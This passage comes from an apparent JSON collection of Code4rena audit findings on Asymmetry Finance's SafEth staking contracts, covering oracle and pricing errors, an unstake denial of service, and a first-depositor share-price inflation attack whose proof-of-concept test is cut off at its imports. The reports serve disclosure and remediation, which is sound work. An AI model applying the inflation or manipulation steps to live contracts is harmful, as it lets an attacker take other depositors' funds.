more/less.\n\n### Recommended Mitigation Steps\n\nChange [these lines](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L115-L116):\n\n            return ((10 ** 18 * frxAmount) /\n                IFrxEthEthPool(FRX_ETH_CRV_POOL_ADDRESS).price_oracle());\n\nto:\n\n            return (frxAmount * IFrxEthEthPool(FRX_ETH_CRV_POOL_ADDRESS).price_oracle() / 10 ** 18);\n\n**[toshiSat (Asymmetry) disputed via duplicate issue `#698`](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/698#issuecomment-1500457335)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> To protect against oracle attacks we assume FRX is 1:1 with ETH and revert if the oracle says otherwise since there is no chainlink for FRX.<br>\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/32) and [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/27).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the [ethPerDerivative()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L111-L117) function in the code-423n4/2023-03-asymmetry repository. This function is used in [stake()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L63-L101) and [withdraw()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L60-L88) functions.\n\nThe bug is that the `frxAmount` is multiplied by (10 &ast;&ast; 18) and divided by `price_oracle`, but it should be multiplied by `price_oracle` and divided by (10 &ast;&ast; 18). This incorrect calculation may over or understate the amount of safEth received by the user, and may increase/decrease slippage. If the [withdraw()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L60-L88) function reverts, the function [unstake()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L108-L129) is unavailable => assets are locked.\n\nTo prove the bug, an example is given where the calculation of (10 &ast;&ast; 18) sfrxEth is done. The calculated cost of sfrxEth is then compared with the cost calculated by the [ethPerDerivative()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/641",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "lukris02",
        "reassor",
        "Bauer",
        "rbserver",
        "qpzm",
        "joestakey",
        "koxuan",
        "T1MOH",
        "dec3ntraliz3d",
        "RedTiger"
      ]
    },
    {
      "id": "19918",
      "title": "[H-03] Users can fail to unstake and lose their deserved ETH because malfunctioning or untrusted derivative cannot be removed",
      "impact": "HIGH",
      "content": "\nCalling the following `SafEth.adjustWeight` function can update the weight for an existing derivative to 0. However, there is no way to remove an existing derivative. If the external contracts that an existing derivative depends on malfunction or get hacked, this protocol's functionalities that need to loop through the existing derivatives can behave unexpectedly. Users can fail to unstake and lose their deserved ETH as one of the severest consequences.\n\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L165-L175>\n\n```solidity\n    function adjustWeight(\n        uint256 _derivativeIndex,\n        uint256 _weight\n    ) external onlyOwner {\n        weights[_derivativeIndex] = _weight;\n        uint256 localTotalWeight = 0;\n        for (uint256 i = 0; i < derivativeCount; i++)\n            localTotalWeight += weights[i];\n        totalWeight = localTotalWeight;\n        emit WeightChange(_derivativeIndex, _weight);\n    }\n```\n\nFor example, calling the following `SafEth.unstake` function would loop through all of the existing derivatives and call the corresponding derivative's `withdraw` function. When the `WstEth` contract is one of these derivatives, the `WstEth.withdraw` function would be called, which further calls `IStEthEthPool(LIDO_CRV_POOL).exchange(1, 0, stEthBal, minOut)`. If `self.is_killed` in the stETH-ETH pool contract corresponding to `LIDO_CRV_POOL` becomes true, especially after such pool contract becomes compromised or hacked, calling such `exchange` function would always revert. In this case, calling the `SafEth.unstake` function reverts even though all other derivatives that are not the `WstEth` contract are still working fine. Because the `SafEth.unstake` function is DOS'ed, users cannot unstake and withdraw ETH that they are entitled to.\n\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L108-L129>\n\n```solidity\n    function unstake(uint256 _safEthAmount) external {\n        require(pauseUnstaking == false, \"unstaking is paused\");\n        uint256 safEthTotalSupply = totalSupply();\n        uint256 ethAmountBefore = address(this).balance;\n\n        for (uint256 i = 0; i < derivativeCount; i++) {\n            // withdraw a percentage of each asset based on the amount of safETH\n            uint256 derivativeAmount = (derivatives[i].balance() *\n                _safEthAmount) / safEthTotalSupply;\n            if (derivativeAmount == 0) continue; // if derivative empty ignore\n            derivatives[i].withdraw(derivativeAmount);\n        }\n        ...\n    }\n```\n\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67>\n\n```solidity\n    function withdraw(uint256 _amount) external onlyOwner {\n        IWStETH(WST_ETH).unwrap(_amount);\n        uint256 stEthBal = IERC20(STETH_TOKEN).balanceOf(address(this));\n        IERC20(STETH_TOKEN).approve(LIDO_CRV_POOL, stEthBal);\n        uint256 minOut = (stEthBal * (10 ** 18 - maxSlippage)) / 10 ** 18;\n        IStEthEthPool(LIDO_CRV_POOL).exchange(1, 0, stEthBal, minOut);\n        ...\n    }\n```\n\n<https://etherscan.io/address/0xDC24316b9AE028F1497c275EB9192a3Ea0f67022#code#L441>\n\n```solidity\ndef exchange(i: int128, j: int128, dx: uint256, min_dy: uint256) -> uint256:\n    ...\n    assert not self.is_killed  # dev: is killed\n```\n\n### Proof of Concept\n\nThe following steps can occur for the described scenario.\n\n1.  The `WstEth` contract is one of the existing derivatives. For the `WstEth` contract, the stETH-ETH pool contract corresponding to `LIDO_CRV_POOL` has been hacked in which its `self.is_killed` has been set to true.\n2.  Alice calls the `SafEth.unstake` function but such function call reverts because calling the stETH-ETH pool contract's `exchange` function reverts for the `WstEth` derivative.\n3.  Although all other derivatives that are not the `WstEth` contract are still working fine, Alice is unable to unstake. As a result, she cannot withdraw and loses her deserved ETH.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nThe `SafEth` contract can be updated to add a function, which would be only callable by the trusted admin, for removing an existing derivative that already malfunctions or is untrusted.\n\n**[toshiSat (Asymmetry) confirmed](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/703#issuecomment-1500457717)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Enable/Disable Derivatives.<br>\n\n**Status:** Mitigation confirmed with comments. Full details in reports from d3e4 ([here](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/31) and [here](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/74)), [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/26), and [0x52](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/5).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `SafEth` smart contract. The `SafEth.adjustWeight` function can update the weight for an existing derivative, however, there is no way to remove an existing derivative. If the external contracts that an existing derivative depends on malfunction or get hacked, it can cause unexpected behavior in the protocol. In the worst case, users may be unable to unstake and lose their deserved ETH.\n\nThe bug can occur in the following steps:\n\n1. The `WstEth` contract is one of the existing derivatives. For the `WstEth` contract, the stETH-ETH pool contract corresponding to `LIDO_CRV_POOL` has been hacked in which its `self.is_killed` has been set to true.\n2. Alice calls the `SafEth.unstake` function but such function call reverts because calling the stETH-ETH pool contract's `exchange` function reverts for the `WstEth` derivative.\n3. Although all other derivatives that are not the `WstEth` contract are still working fine, Alice is unable to unstake. As a result, she cannot withdraw and loses her deserved ETH.\n\nThe vulnerability was mitigated by enabling/disabling derivatives, which was confirmed by the team at Asymmetry. Full details can be found in reports from d3e4, adriro, and 0x52.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/703",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "J4de",
        "kaden",
        "koxuan",
        "P7N8ZK",
        "Parad0x",
        "bytes032",
        "IgorZuk",
        "carrotsmuggler",
        "lukris02",
        "rbserver",
        "tnevler",
        "Stiglitz",
        "0xAgro",
        "DeStinE21",
        "csanuragjain",
        "DadeKuma",
        "dec3ntraliz3d",
        "rvierdiiev"
      ]
    },
    {
      "id": "19917",
      "title": "[H-02] A temporary issue shows in the staking functionality which leads to the users receiving less minted tokens",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L63-L101><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L156-L204><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L211-L216>\n\n### Derivative Reth prices\n\nA quick explanation of the issue causing it, the problem is based on the function \"ethPerDerivative\" in the Reth derivative.\n\nAs you can see two statements can be triggered here, the first one \"if (poolCanDeposit(\\_amount))\" checks if the given amount + the pool balance isn't greater than the maximumDepositPoolSize and that the amount is greater than the minimum deposit in the pool. Second statement is meant to return a poolPrice which is slightly more than the regular one, because it's used in order to swap tokens in Uniswap and therefore the price per token is overpriced.\n\n```solidity\nfunction ethPerDerivative(uint256 _amount) public view returns (uint256) {\n        if (poolCanDeposit(_amount))\n            return\n                RocketTokenRETHInterface(rethAddress()).getEthValue(10 ** 18);\n        else return (poolPrice() * 10 ** 18) / (10 ** 18);\n    }\n```\n\n```solidity\n// poolCanDeposit() returns:\n      return\n            rocketDepositPool.getBalance() + _amount <=\n            rocketDAOProtocolSettingsDeposit.getMaximumDepositPoolSize() &&\n            _amount >= rocketDAOProtocolSettingsDeposit.getMinimumDeposit();\n```\n\nBelow you can see the regular price returned in the first statement - 1063960369075232250:\n\n<img width=\"417\" alt=\"Screenshot 2023-03-27 at 8 53 34\" src=\"https://user-images.githubusercontent.com/112419701/227852484-9bf0144d-820d-414c-8cb9-e1fb44f5c806.png\">\n\nBelow you can see the pool price from the second statement, supposed to be used only when a swap is made.\n\n```solidity\nelse return (poolPrice() * 10 ** 18) / (10 ** 18);\n\n// poolPrice calculates and returns\nuint160 sqrtPriceX96, , , , , , ) = pool.slot0();\n        return (sqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)) >> (96 * 2);\n\n// uint160 sqrtPriceX96 = 81935751724326368909606241317\n// return (sqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)) >> (96 * 2);\n// return 1069517062752670179 (pool price)\n\n// The function \"ethPerDerivative\" for the else statement return (poolPrice() * 10 ** 18) / (10 ** 18);\n// Which will be - 1069517062752670179\n```\n\nDifference between the regular price and the pool price:\n\n    regular price - 1063960369075232250\n    pool price -    1069517062752670179\n\n### Quick Overview\n\nWhat can result to users receiving less minted tokens?\n\nThe first thing the staking function does is calculating the derivative underlyingValue. This issue occurs on the Reth derivative, as we can see the staking function calls \"ethPerDerivative\" to get the price, but takes as account the whole Reth balance of the derivative contract.\n\nFor example let's say the derivative Reth holds 200e18. The pool has free space for 100e18 more till it reaches its maximum pool size. As the function calls ethPerDerivative with the Reth balance of 200e18 instead of the amount being staked.\nThe contract will think there is no more space in the pool (even tho there is 100e18 more) and will return the pool price which is overpriced and meant for the swap in Uniswap.\n\n```solidity\nunderlyingValue +=\n                (derivatives[i].ethPerDerivative(derivatives[i].balance()) *\n                    derivatives[i].balance()) /\n                10 ** 18;\n\n```\n\n```solidity\nfunction ethPerDerivative(uint256 _amount) public view returns (uint256) {\n        if (poolCanDeposit(_amount))\n            return\n                RocketTokenRETHInterface(rethAddress()).getEthValue(10 ** 18);\n        else return (poolPrice() * 10 ** 18) / (10 ** 18);\n    }\n\n// poolCanDeposit(_amount)\nreturn\n        rocketDepositPool.getBalance() + _amount <=\n        rocketDAOProtocolSettingsDeposit.getMaximumDepositPoolSize() &&\n        _amount >= rocketDAOProtocolSettingsDeposit.getMinimumDeposit();\n```\n\nLet's follow what actually happens, for now we have wrong overpriced underlying value of the derivative Reth.\n\nNext the function calculates the preDepositPrice. l will do the real calculations in the POC, but its easy to assume that if the underlyingValue is overpriced the preDepositPrice will be too based on the calculation below.\n\n```solidity\nelse preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;\n```\n\nLet's say the user deposits 5e18\n\nHere comes the real problem, so far the function calculates the local variables as there will be swap to Uniswap.\n\nAs mentioned in the beginning the pool has 100e18 free space, so in the deposit function in Reth, the swap to Uniswap will be ignored as `poolCanDeposit(msg.value) == true` and the msg.value will be deposited in the rocket pool.\n\n```solidity\nuint256 depositAmount = derivative.deposit{value: ethAmount}();\n```\n\n```solidity\nfunction deposit() external payable onlyOwner returns (uint256) {\n        // Per RocketPool Docs query addresses each time it is used\n        address rocketDepositPoolAddress = RocketStorageInterface(\n            ROCKET_STORAGE_ADDRESS\n        ).getAddress(\n                keccak256(\n                    abi.encodePacked(\"contract.address\", \"rocketDepositPool\")\n                )\n            );\n\n        RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(\n                rocketDepositPoolAddress\n            );\n\n        if (!poolCanDeposit(msg.value)) {\n            uint rethPerEth = (10 ** 36) / poolPrice();\n\n            uint256 minOut = ((((rethPerEth * msg.value) / 10 ** 18) *\n                ((10 ** 18 - maxSlippage))) / 10 ** 18);\n\n            IWETH(W_ETH_ADDRESS).deposit{value: msg.value}();\n            uint256 amountSwapped = swapExactInputSingleHop(\n                W_ETH_ADDRESS,\n                rethAddress(),\n                500,\n                msg.value,\n                minOut\n            );\n\n            return amountSwapped;\n        } else {\n            address rocketTokenRETHAddress = RocketStorageInterface(\n                ROCKET_STORAGE_ADDRESS\n            ).getAddress(\n                    keccak256(\n                        abi.encodePacked(\"contract.address\", \"rocketTokenRETH\")\n                    )\n                );\n            RocketTokenRETHInterface rocketTokenRETH = RocketTokenRETHInterface(\n                rocketTokenRETHAddress\n            );\n            uint256 rethBalance1 = rocketTokenRETH.balanceOf(address(this));\n            rocketDepositPool.deposit{value: msg.value}();\n            uint256 rethBalance2 = rocketTokenRETH.balanceOf(address(this));\n            require(rethBalance2 > rethBalance1, \"No rETH was minted\");\n            uint256 rethMinted = rethBalance2 - rethBalance1;\n            return (rethMinted);\n        }\n    }\n```\n\nNext the function calculates the \"derivativeReceivedEthValue\", this time the function ethPerDerivative(depositAmount) will return the normal price as there is space in the pool. Both \"derivativeReceivedEthValue\" and \"totalStakeValueEth\" will be calculated based on the normal price.\n\n```solidity\nuint derivativeReceivedEthValue = (derivative.ethPerDerivative(\n                depositAmount\n            ) * depositAmount) / 10 ** 18;\n```\n\n```solidity\ntotalStakeValueEth += derivativeReceivedEthValue;\n```\n\nIf we take the info so far and apply it on the mintAmount calculation below, we know that \"totalStakeValueEth\" is calculated on the normal price and \"preDepositPrice\" is calculated on the overpriced pool price. So the user will actually receive less minted shares than he is supposed to get.\n\n```solidity\nuint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;\n```\n\n### Proof of Concept - Part 1\n\nWill start from the start in order to get the right amounts of \"totalSupply\" and the Reth balance of derivative.\nSo I can show the issue result in POC Part 2.\n\nThe values below are only made for the example.\n\nLet's say we have two stakers - Bob and Kiki each depositing 100e18.\n\nWe have only one derivative which is Reth, so it will have 100% weight.\n\nBob deposits 100e18 as the first depositer and receives (99999999999999999932) minted tokens of safETH.\n\nSo far after Bob deposit:\n\ntotalSupply = 99999999999999999932\n\nReth derivative balance = 93988463204618701706\n\n```solidity\nuint256 underlyingValue = 0;\nuint256 totalSupply = 0; \nuint256 preDepositPrice = 1e18\n\n// As we have only derivative Reth in the example, it owns all of the weight.\nuint256 ethAmount = (msg.value * weight) / totalWeight;\nuint256 ethAmount = (100e18 * 1000) / 1000;\n\n// not applying the deposit fee in rocketPool\n\nuint256 depositAmount = derivative.deposit{value: ethAmount}();\nuint256 depositAmount = 93988463204618701706\n\nuint derivativeReceivedEthValue = (derivative.ethPerDerivative(depositAmount) * depositAmount) / 10 ** 18;\nuint derivativeReceivedEthValue = (1063960369075232250 * 93988463204618701706) / 10 ** 18;\nuint derivativeReceivedEthValue = 99999999999999999932\n\ntotalStakeValueEth = 99999999999999999932;\n\n \nuint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;\nuint256 mintAmount = (99999999999999999932 * 10 ** 18) / 1e18;\nuint256 mintAmount = 99999999999999999932\n```\n\nKiki deposits 100e18 as well and receives (99999999999999999932) minted tokens of safEth.\n\nSo far after Kiki's deposit:\n\ntotalSupply = 199999999999999999864;\n\nReth derivative balance = 187976926409237403412;\n\n```solidity\n// take the info after bob's deposit and the normal price\nunderlyingValue  = (derivatives[i].ethPerDerivative(derivatives[i].balance()) * derivatives[i].balance()) / 10 ** 18;\nuint256 underlyingValue = (1063960369075232250 * 93988463204618701706) / 10 ** 18;\nuint256 underlyingValue = 99999999999999999932;\n\nuint256 totalSupply = 99999999999999999932; \n\nuint256 preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;\nuint256 preDepositPrice = (10 ** 18 * 99999999999999999932) / 99999999999999999932;\nuint256 preDepositPrice = 1e18;\n\n\n// As we have only derivative Reth in the example, it owns all of the weight.\nuint256 ethAmount = (msg.value * weight) / totalWeight;\nuint256 ethAmount = (100e18 * 1000) / 1000;\n\n// not applying the deposit fee in rocketPool\nuint256 depositAmount = 93988463204618701706\n\nuint derivativeReceivedEthValue = (derivative.ethPerDerivative(depositAmount) * depositAmount) / 10 ** 18;\nuint derivativeReceivedEthValue = (1063960369075232250 * 93988463204618701706) / 10 ** 18;\nuint derivativeReceivedEthValue = 99999999999999999932\n\ntotalStakeValueEth = 99999999999999999932;\n \nuint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;\nuint256 mintAmount = (99999999999999999932 * 10 ** 18) / 1e18;\nuint256 mintAmount = 99999999999999999932\n```\n\n### Proof of Concept - Part 2\n\nFrom the first POC, we calculated the outcome of 200e18 staked into the Reth derivative. We got the totalSupply and the Reth balance the derivative holds. So we can move onto the main POC, where l can show the difference and how much less minted tokens the user gets.\n\n    totalSupply = 199999999999999999864;\n    Reth derivative balance = 187976926409237403412;\n\nFirst l am going to show how much minted tokens the user is supposed to get without applying the issue occurring. And after that l will do the second one and apply the issue. So we can compare the outcomes and see how much less minted tokens the user gets.\n\nWithout the issue occurring, a user deposits 5e18 by calling the staking function. The user received (4999549277935239332) minted tokens of safEth.\n\n```solidity\nuint256 underlyingValue  = (derivatives[i].ethPerDerivative(derivatives[i].balance()) * derivatives[i].balance()) / 10 ** 18;\nuint256 underlyingValue  = (1063960369075232250 * 187976926409237403412) / 10 ** 18;\nuint256 underlyingValue  = 199999999999999999864;\n\n\nuint256 totalSupply = 199999999999999999864; \n\nuint256 preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;\nuint256 preDepositPrice = (10 ** 18 * 199999999999999999864) / 199999999999999999864;\nuint256 preDepositPrice = 1e18;\n\n// As we have only derivative Reth in the example, it owns all of the weight.\nuint256 ethAmount = (msg.value * weight) / totalWeight;\nuint256 ethAmount = (5e18 * 1000) / 1000;\n\n// not applying the deposit fee in rocketPool\nuint256 depositAmount = 4698999533488942411\n\nuint derivativeReceivedEthValue = (derivative.ethPerDerivative(depositAmount) * depositAmount) / 10 ** 18;\nuint derivativeReceivedEthValue = (1063960369075232250 * 4698999533488942411) / 10 ** 18;\nuint derivativeReceivedEthValue = 4999549277935239332\n\ntotalStakeValueEth = 4999549277935239332;\n \nuint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;\nuint256 mintAmount = (4999549277935239332 * 10 ** 18) / 1e18;\nuint256 mintAmount = 4999549277935239332\n```\n\nStats after the deposit without the issue:\n\n    totalSupply = 204999549277935239196\n    Reth derivative balance = 192675925942726345823;\n\nThis time we apply the issue occurring and as the first one a user deposits 5e18 by calling the staking function. The user receives (4973574036557377784) minted tokens of saEth\n\n```solidity\nuint256 underlyingValue  = (derivatives[i].ethPerDerivative(derivatives[i].balance()) * derivatives[i].balance()) / 10 ** 18;\n// the function takes as account the pool price here which is overpriced.\nuint256 underlyingValue  = (1069517062752670179 * 187976926409237403412) / 10 ** 18;\nuint256 underlyingValue  = 201044530198482424206\n\nuint256 totalSupply = 199999999999999999864;\n\nuint256 preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;\nuint256 preDepositPrice = (10 ** 18 * 201044530198482424206) / 199999999999999999864;\nuint256 preDepositPrice = 1005222650992412121;\n\n// As we have only derivative Reth in the example, it owns all of the weight.\nuint256 ethAmount = (msg.value * weight) / totalWeight;\nuint256 ethAmount = (5e18 * 1000) / 1000;\n\n// not applying the deposit fee in rocketPool\nuint256 depositAmount = 4698999533488942411\n\n// Here the function calculates based on the normal price, as the pool has free space and the user deposits only 5e18.\nuint derivativeReceivedEthValue = (derivative.ethPerDerivative(depositAmount) * depositAmount) / 10 ** 18;\nuint derivativeReceivedEthValue = (1063960369075232250 * 4698999533488942411) / 10 ** 18;\nuint derivativeReceivedEthValue = 4999549277935239332\n\ntotalStakeValueEth = 4999549277935239332;\n \nuint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;\nuint256 mintAmount = (4999549277935239332 * 10 ** 18) / 1005222650992412121;\nuint256 mintAmount = 4973574036557377784\n```\n\nStats after the deposit with the issue:\n\n    totalSupply = 204973574036557377648;\n    Reth derivative balance = 192675925942726345823;\n\nDifference between outcomes:\n\n    Without the issue based on 5e18 deposit, the user receives -        4999549277935239332 minted tokens\n    With the issue occurring based on 5e18 deposit, the user receives - 4973574036557377784 minted tokens\n\n### Proof of Concept - Plus\n\nSo far we found that this issue leads to users receiving less minted shares, but let's go even further and see how much the user losses in terms of ETH. By unstaking the minted amount.\n\nFirst we apply the stats without the issue occurring.\n\n    totalSupply = 204999549277935239196\n    Reth derivative balance = 192675925942726345823;\n\n```solidity\nuint256 derivativeAmount = (derivatives[i].balance() * _safEthAmount) / safEthTotalSupply;\nuint256 derivativeAmount = (192675925942726345823 * 4999549277935239332) / 204999549277935239196;\nuint256 derivativeAmount = 4698999533488942410;\n\n// Eth value based on the current eth price\n// Reth to Eth value - 4698999533488942410 => 4.999999999999999998 - 8766.85 usd\n\n```\n\nSecond we apply the stats with the issue occurring.\n\n    totalSupply = 204973574036557377648;\n    Reth derivative balance = 192675925942726345823;\n\n```solidity\nuint256 derivativeAmount = (derivatives[i].balance() * _safEthAmount) / safEthTotalSupply;\nuint256 derivativeAmount = (192675925942726345823 * 4973574036557377784) / 204973574036557377648;\nuint256 derivativeAmount = 4675178189396666336;\n\n// Eth value based on the current eth price\n// Reth to Eth value - 4675178189396666336 => 4.974637740558436705 - 8722.41 usd\n\n```\n\n### Recommended Mitigation Steps\n\nThe problem occurs with calculating the underlyingValue in the staking function. The function \"ethPerDerivative\" is called with all of the Reth balance, which should not be the case here. Therefore the function calls \"poolCanDeposit\" in order to check if the pool has space for the Reth derivative balance (Basically the contract thinks that the Reth balance in the derivative will be deposited in the pool, which is not the case here). So even if the pool has space for the depositing amount by the user, the poolCanDeposit(\\_amount) will return false and the contract will get the poolPrice of the reth which is supposed to be used only for the swap in Uniswap. The contract process executing the staking function with the overpriced pool price and doesn't perform any swap, but deposits the user funds to the pool.\n\n```solidity\nunderlyingValue +=\n                (derivatives[i].ethPerDerivative(derivatives[i].balance()) *\n                    derivatives[i].balance()) /\n                10 ** 18;\n```\n\n```solidity\nfunction ethPerDerivative(uint256 _amount) public view returns (uint256) {\n        if (poolCanDeposit(_amount))\n            return\n                RocketTokenRETHInterface(rethAddress()).getEthValue(10 ** 18);\n        else return (poolPrice() * 10 ** 18) / (10 ** 18);\n    }\n```\n\n```solidity\nreturn\n        rocketDepositPool.getBalance() + _amount <=\n        rocketDAOProtocolSettingsDeposit.getMaximumDepositPoolSize() &&\n        _amount >= rocketDAOProtocolSettingsDeposit.getMinimumDeposit();\n```\n\nl'd recommend creating a new function in the reth derivative contract. Which converts the msg.value to reth tokens and using it instead of the whole Reth balance the derivative holds.\n\n```solidity\nfunction rethValue(uint256 _amount) public view returns (uint256) {\n      RocketTokenRETHInterface(rethAddress()).getRethValue(amount);\n    }\n```\n\nLike this we check if the msg.value converted into reth tokens is below the maximumPoolDepositSize and greater than the minimum deposit.\n\n```solidity\nunderlyingValue +=\n                (derivatives[i].ethPerDerivative(derivatives[i].rethValue(msg.value)) *\n                    derivatives[i].balance()) /\n                10 ** 18;\n```\n\n**[toshiSat (Asymmetry) confirmed](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1004#issuecomment-1499725139)**\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1004#issuecomment-1517884894):**\n > This report is great but only tackles a part of the problem: the pricing method is versatile and manipulable, so it can 1 - lead to a loss of funds as show here depending on the condition but more importantly be manipulated easily.\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Don't get rETH from pool on deposits.<br>\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/30), [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/24), and [0x52](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/4).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a problem with the function \"ethPerDerivative\" in the Reth derivative contract. The issue occurs when a user attempts to stake tokens and the function calculates the price based on the total Reth balance of the derivative contract, instead of the amount being staked. This can result in users receiving less minted tokens than they should.\n\nThe function \"ethPerDerivative\" has two statements that can be triggered. The first statement checks if the given amount plus the pool balance is not greater than the maximumDepositPoolSize and that the amount is greater than the minimum deposit in the pool. The second statement is meant to return a poolPrice which is slightly more than the regular one, because it's used in order to swap tokens in Uniswap and therefore the price per token is overpriced. \n\nThe issue is that the function uses the overpriced poolPrice, when the pool has space for more tokens. This results in the user receiving less minted tokens than they should.\n\nThe bug was confirmed by toshiSat (Asymmetry) and commented on by Picodes (judge). The asymmetry was mitigated by not getting rETH from the pool on deposits. The mitigation was confirmed with comments from reports from d3e4, adriro, and 0x52.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1004",
      "tags": [],
      "finders": [
        "igingu",
        "MiloTruck",
        "rbserver",
        "gjaldon",
        "0xd1r4cde17a",
        "bin2chen",
        "Moliholy",
        "MadWookie",
        "koxuan",
        "CodingNameKiki",
        "slippopz",
        "shaka",
        "ast3ros",
        "adriro",
        "rvierdiiev",
        "giovannidisiena",
        "Franfran"
      ]
    },
    {
      "id": "19916",
      "title": "[H-01] An attacker can manipulate the preDepositvePrice to steal from other users",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L79><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98>\n\n### Impact\n\nThe first user that stakes can manipulate the total supply of sfTokens and by doing so create a rounding error for each subsequent user. In the worst case, an attacker can steal all the funds of the next user.\n\n### Proof of Concept\n\nWhen the first user enters totalSupply is set to 1e18 on [L79](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L79):\n\n```solidity\nif (totalSupply == 0)\n            preDepositPrice = 10 ** 18; // initializes with a price of 1\n        else preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;\n```\n\nBut the user can immediately unstake most of his safETH such that totalSupply <<  1e18. The attacker can then transfer increase the underlying amount by transferring derivative tokens to the derivative contracts.\n\nFor subsequent users, the preDepositPrice will be heavily inflated and the calculation of mintAmount on [L98](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98):\n\n```solidity\nuint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;\n```\n\ncan be very inaccurate. In the worst case it rounds down to 0 for users that deposit value that is less than the value that the attacker transferred in.\n\nIn the following POC the attacker steals all of the second user's deposit. The attacker first deposits 100 ETH and immediately removes all but 1 wei. The attacker then transfers 10 wsETH to the WstEth contract. When the second user enters with 1.5 ETH no additional safETH are minted since the minAmount is rounded down to 0. The attacker has all of the safTokens and can withdraw 100% of deposits.\n\nCreate a new test file with the following content to run the POC.\n\n```solidity\nimport { SafEth } from \"../typechain-types\";\n\nimport { ethers, upgrades, network } from \"hardhat\";\nimport { expect } from \"chai\";\nimport {\n  getAdminAccount,\n  getUserAccounts,\n  getUserBalances,\n  randomStakes,\n  randomUnstakes,\n} from \"./helpers/integrationHelpers\";\nimport { getLatestContract } from \"./helpers/upgradeHelpers\";\nimport { BigNumber } from \"ethers\";\n\nimport ERC20 from \"@openzeppelin/contracts/build/contracts/ERC20.json\";\nimport { RETH_MAX, WSTETH_ADRESS, 